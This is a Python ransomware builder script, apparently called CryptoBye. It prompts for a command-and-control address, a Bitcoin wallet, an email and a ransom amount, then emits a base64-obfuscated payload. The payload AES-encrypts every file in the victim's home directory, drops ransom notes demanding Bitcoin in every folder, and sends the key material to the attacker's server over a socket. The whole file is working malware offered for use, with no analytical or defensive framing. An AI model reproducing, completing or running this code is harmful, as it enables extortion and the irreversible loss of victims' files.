#!/usr/bin/python

import sys, os, base64

if len(sys.argv) < 2:

    print('Usage: python ' + sys.argv[0] + ' (generate/listen)')
    exit()
    
if sys.argv[1] == 'listen':

    print('[*] Selected: listen')
    port = raw_input('[=] Listening Port: ')
    os.system('python modules/server.py ' + port)

elif sys.argv[1] == 'generate':

    print('[*] Selected: generate')
    payload = '''#!/usr/bin/python
import socket,os,random,shutil,commands,zlib,base64;from random import randint;from Crypto.PublicKey import RSA;from Crypto.Cipher import PKCS1_OAEP,AES;from Crypto import Random;from Crypto.Hash import SHA256
BLOCK_SIZE = 16  
pad = lambda s: s + (BLOCK_SIZE - len(s) % BLOCK_SIZE) * \
                chr(BLOCK_SIZE - len(s) % BLOCK_SIZE)
unpad = lambda s: s[:-ord(s[len(s) - 1:])]

base64pad = lambda s: s + '=' * (4 - len(s) % 4)
base64unpad = lambda s: s.rstrip("=")


def genKeys(bits):
    key=RSA.generate(int(bits),Random.new().read);privatekey=key.exportKey('PEM');publickey=key.publickey().exportKey('PEM');ret=privatekey+':'+publickey;lst=ret.split(':');return lst        
def encryptText(text, publickey):
    rsa_key=RSA.importKey(publickey);rsa_key=PKCS1_OAEP.new(rsa_key);out=base64.b64encode(rsa_key.encrypt(zlib.compress(text)));return out
def encrypt0r(key, raw):
    key = SHA256.new(key.encode('utf-8')).digest()
    raw = pad(raw)
    iv = Random.new().read(AES.block_size)
    iv2 = Random.new().read(AES.block_size)    
    cipher = AES.new(key, AES.MODE_CBC, iv)     
    out = base64.b64encode(iv2 + cipher.encrypt(raw) + iv)     
    out = out.encode('rot13')
    return out
    
def randomAll():
    key = ''
    for i in range(0,randint(10,20)):
        key=key+random.choice(base64.b64decode('MTIzNDU2Nyw7PD44OTBBQkNEIiQjQCUmP0VGR0hJSktMTU5PUFFSKSgvIVwqe1NUVVZXWFlaYWJjZGVmXVs9fS5naGlqa2xtbm9wcXJzdHV2d3h5el8tK3w='))
    out=str(randint(0,9999999)).replace('L','')+':'+key;return out
def encryptAll(user,key):
    if user == 'root':
        o0o = '/root'
    else:
        o0o = '/home/' + user
    for root,dirs,files in os.walk(o0o):
        for i in files:
            try:
                f = open(os.path.join(root,i), 'r')
                raw = f.read()
                f.close()
                out = encrypt0r(key, raw)
                f2 = open(os.path.join(root,i), 'w')
                f2.write(out)
                f2.close()
                shutil.move(os.path.join(root,i), os.path.join(root,i) + '.cbye')
            except:
                print('')
def createAdv(user,btc):
    MSG=base64.b64decode('ICAgIAogICAgSU1QT1JUQU5UICEhISEhISEhISEhCj09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PQoKKioqIEdSRUVUSU5HUyA=') +user+base64.b64decode('ICoqKgoKQXJlIHlvdXIgZmlsZXMgZW5jcnlwdGVkPyBZZXAuLi4uCgpBTEwgWU9VUiBJTVBPUlRBTlQgRklMRVMgUklHSFQgTk9XIFNVQ0ggQVMgUEhPVE9TLCBET0NVTUVOVFMsIFBST0dSQU1TLi4uIEhBRCBCRUVOIEVOQ1JZUFRFRApUSEFUIE1FQU5TIFlPVSBDQU4nVCBSRUNPVkVSIFRIRU0gVU5MRVNTIFlPVSBIQVZFIEEgUEFTU1dPUkQuLi4KCkhPVyBDQU4gSSBSRUNPVkVSIE1ZIEZJTEVTPwoKVkVSWSBFQVNZLi4uIFBBWSA=')+base64.b64decode('PAYMENTHERE')+base64.b64decode('ICQgSU4gQklUQ09JTiAoQlRDKSBUTyBUSElTIEFERFJFU1M6IA==')+btc+base64.b64decode('ClRIRU4gU0VORCBBTiBFTUFJTCBBU0tJTkcgRk9SIFRIRSBSRUNPVkVSWSBQQVNTV09SRCBUTyA=')+base64.b64decode('EMAILHERE')+base64.b64decode('ClBMRUFTRSBTUEVDSUZZIFlPVVIgQklUQ09JTiBBRERSRVNTIElOIFRIRSBFTUFJTCwgU08gV0UgQ0FOIEtOT1cgV0hJQ0ggSVMgWU9VUiBTWVNURU0gRklMRVMgUEFTU1dPUkQKClRIRU4gWU9VIFdJTEwgUkVDRUlWRSBBTiBFTUFJTCBXSVRIIFlPVVIgUEFTU1dPUkQuLi4KClRPIERFQ1JZUFQgRklMRVMgRVhFQ1VURSBUSEUgY3J5cHRvYnllX2RlY3J5cHQwci5weSBBUyBUSEUgU0FNRSBVU0VSIFdJVEggVEhFIEVOQ1JZUFRFRCBGSUxFUyBBTkQgClNQRUNJRlkgVEhFIFBBU1NXT1JEIFdIRU4gVEhFIFBST0dSQU0gQVNLUyBGT1IgSVQuLi4KCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICB+IFdpdGggTG92ZTogQW5vbnltb3VzCgoKCiAgIA==')
    if user == 'root':
        o0o = '/root'
    else:
        o0o = '/home/' + user
    for root,dirs,files in os.walk(o0o):
        for i in dirs:
            f=open(os.path.join(root,i)+'/README_IMPORTANT.txt','w');f.write(MSG);f.close()
def createDecrypt0r(user):
    DECRYPT0R = 'aW1wb3J0IG9zLHNodXRpbCxjb21tYW5kcyxiYXNlNjQKZnJvbSBDcnlwdG8uQ2lwaGVyIGltcG9ydCBBRVMKZnJvbSBDcnlwdG8uSGFzaCBpbXBvcnQgU0hBMjU2CkJMT0NLX1NJWkUgPSAxNgpwYWQgPSBsYW1iZGEgczogcyArIChCTE9DS19TSVpFIC0gbGVuKHMpICUgQkxPQ0tfU0laRSkgKiBcCiAgICAgICAgICAgICAgICBjaHIoQkxPQ0tfU0laRSAtIGxlbihzKSAlIEJMT0NLX1NJWkUpCnVucGFkID0gbGFtYmRhIHM6IHNbOi1vcmQoc1tsZW4ocykgLSAxOl0pXQoKZGVmIGRlY3J5cHQwcihrZXksIGVuYyk6CiAgICBrZXkgPSBTSEEyNTYubmV3KGtleS5lbmNvZGUoJ3V0Zi04JykpLmRpZ2VzdCgpCiAgICBlbmMgPSBlbmMuZGVjb2RlKCdyb3QxMycpCiAgICBlbmMgPSBiYXNlNjQuYjY0ZGVjb2RlKGVuYykKICAgIGZha2VpdiA9IGVuY1s6MTZdCiAgICBtc2dhID0gZW5jWzE2Ol0KICAgIG1zZyA9IG1zZ2FbOi0xNl0KICAgIGl2ID0gbXNnYVstMTY6XQogICAgY2lwaGVyID0gQUVTLm5ldyhrZXksIEFFUy5NT0RFX0NCQywgaXYpCiAgICBvdXQgPSB1bnBhZChjaXBoZXIuZGVjcnlwdChtc2cpKS5kZWNvZGUoJ3V0ZjgnKQogICAgcmV0dXJuIG91dAoKICAgIApkZWYgZGVjcnlwdEFsbCh1c2VyLCBrZXkpOgogICAgaWYgdXNlciA9PSAncm9vdCc6CiAgICAgICAgbzBvID0gJy9yb290JwogICAgZWxzZToKICAgICAgICBvMG8gPSAnL2hvbWUvJyArIHVzZXIKICAgIGZvciByb290LCBkaXJzLCBmaWxlcyBpbiBvcy53YWxrKG8wbyk6CiAgICAgICAgZm9yIGkgaW4gZmlsZXM6CiAgICAgICAgICAgIHRyeToKICAgICAgICAgICAgICAgIGYgPSBvcGVuKG9zLnBhdGguam9pbihyb290LCBpKSwgJ3InKQogICAgICAgICAgICAgICAgcmF3ID0gZi5yZWFkKCkKICAgICAgICAgICAgICAgIGYuY2xvc2UoKQogICAgICAgICAgICAgICAgb3V0ID0gZGVjcnlwdDByKGtleSwgcmF3KQogICAgICAgICAgICAgICAgZjIgPSBvcGVuKG9zLnBhdGguam9pbihyb290LCBpKSwgJ3cnKQogICAgICAgICAgICAgICAgZjIud3JpdGUob3V0KQogICAgICAgICAgICAgICAgZjIuY2xvc2UoKQogICAgICAgICAgICAgICAgc2h1dGlsLm1vdmUob3MucGF0aC5qb2luKHJvb3QsaSksIG9zLnBhdGguam9pbihyb290LGkpWzotNV0pCiAgICAgICAgICAgIGV4Y2VwdDoKICAgICAgICAgICAgICAgIHByaW50KCcnKQogICAgICAgIGZvciBpIGluIGRpcnM6CiAgICAgICAgICAgIHRyeToKICAgICAgICAgICAgICAgIG9zLnN5c3RlbSgncm0gJyArIG9zLnBhdGguam9pbihyb290LCBpKSArICcvUkVBRE1FX0lNUE9SVEFOVC50eHQgOyBybSAnICsgb3MucGF0aC5qb2luKHJvb3QsIGkpICsgJy9jcnlwdG9ieWVfZGVjcnlwdDByLnB5JykKICAgICAgICAgICAgZXhjZXB0OgogICAgICAgICAgICAgICAgcHJpbnQoJycpCiAgICAKcHJpbnQoIiIiCgoqKiogV2VsY29tZSB0byB0aGUgQ3J5cHRvQnllIERlY3J5cHQwciAqKioKPS09LT0tPS09LT0tPS09LT0tPS09LT0tPS09LT0tPS09LT0tPS09LT0tPS09LT0KCkZvbGxvdyB0aGUgc3RlcHMgb2YgYW55IG9mIHRoZSAnUkVBRE1FX0lNUE9SVEFOVC50eHQnIGZpbGVzLi4uCgpEbyB5b3UgYWxyZWFkeSBoYXZlIHRoZSBwYXNzd29yZD8KCkxldCdzIGRlY3J5cHQgdGhlIGZpbGVzLi4uCgpBVFRFTlRJT04hIERPIE5PVCBURVNUIFdJVEggUkFORE9NIFBBU1NXT1JEIE9SIFRIRSBGSUxFUyBPVVRQVVQgV0lMTCBCRSBPVkVSV1JJVFRFTiBXSVRIIApXUk9ORyBEQVRBIEFORCBUSEUgRklMRVMgV09OVCBCRSBERUNSWVBURUQgTkVWRVIhLi4uCgotLS0tCgoKIiIiKQoKbmV4dCA9IHJhd19pbnB1dCgnXDAzM1sxOzMzbVshXVwwMzNbMG0gQXJlIHlvdSBzdXJlIHRoZSBwYXNzd29yZCBpcyBjb3JyZWN0PyBbeS9OXTogJykKaWYgbmV4dCAhPSAneSc6CiAgICBleGl0KCkKcGFzc3dvcmQgPSByYXdfaW5wdXQoJ1wwMzNbMTszNG1bPV1cMDMzWzBtIFBhc3N3b3JkOiAnKQpuZXh0ID0gcmF3X2lucHV0KCdcMDMzWzE7MzNtWyFdXDAzM1swbSBSRUFMTFk/IEFyZSB5b3UgVkVSWSBTVVJFIHRoZSBwYXNzd29yZCBpcyBjb3JyZWN0PyBbeS9OXTogJykKaWYgbmV4dCAhPSAneSc6CiAgICBleGl0KCkKcHJpbnQoJ1wwMzNbMTszNG1bKl1cMDMzWzBtIERlY3J5cHRpbmcgdGhlIGZpbGVzLi4uJykKZGVjcnlwdEFsbChjb21tYW5kcy5nZXRvdXRwdXQoJ3dob2FtaScpLCBwYXNzd29yZCkKcHJpbnQoJ1wwMzNbMTszMm1bK11cMDMzWzBtIENvbmdyYXR1bGF0aW9ucyEgQWxsIHlvdXIgZmlsZXMgaGFkIGJlZW4gZGVjcnlwdGVkIHN1Y2Nlc3NmdWxseS4gRW5qb3kgdGhlbSEgOyknKQ=='
    if user == 'root':
        o0o = '/root'
    else:
        o0o = '/home/' + user
    for root,dirs,files in os.walk(o0o):
        for i in dirs:
            f=open(os.path.join(root,i)+'/cryptobye_decrypt0r.py','w');f.write(base64.b64decode(DECRYPT0R));f.close()
KEYID=randomAll();keyid2=KEYID.split(':');encryptAll(commands.getoutput('whoami'),keyid2[1]);createAdv(commands.getoutput('whoami'),base64.b64decode('ADDRHERE'));createDecrypt0r(commands.getoutput('whoami'));s=socket.socket();s.connect((base64.b64decode('IPHERE'),PORTHERE));keys=genKeys(2048);pk=s.recv(1024);s.send(keys[1]);s.recv(1024);s.send(encryptText(KEYID,pk));s.recv(1024);exit()'''


    ip = raw_input('[=] C&C IP Address: ')
    port = raw_input('[=] C&C Port: ')
    btcaddr = raw_input('[=] Bitcoin Address: ')
    emailaddr = raw_input('[=] Email Address: ')
    payment = raw_input('[=] Payment in Dollars: ')
    path = raw_input('[=] Output Path: ')
    print('[*] Generating Payload')
    payload = payload.replace('IPHERE', base64.b64encode(ip))
    payload = payload.replace('PORTHERE', port)
    payload = payload.replace('ADDRHERE', base64.b64encode(btcaddr))
    payload = payload.replace('EMAILHERE', base64.b64encode(emailaddr))
    payload = payload.replace('PAYMENTHERE', base64.b64encode(payment))
    f = open(path, 'w')
    f.write("import base64;exec(base64.b64decode('" + base64.b64encode(payload) + "'))")
    f.close()
    print('[+] Payload generated successfully in: ' + path)
    
else:

    print('[-] Unknown option')
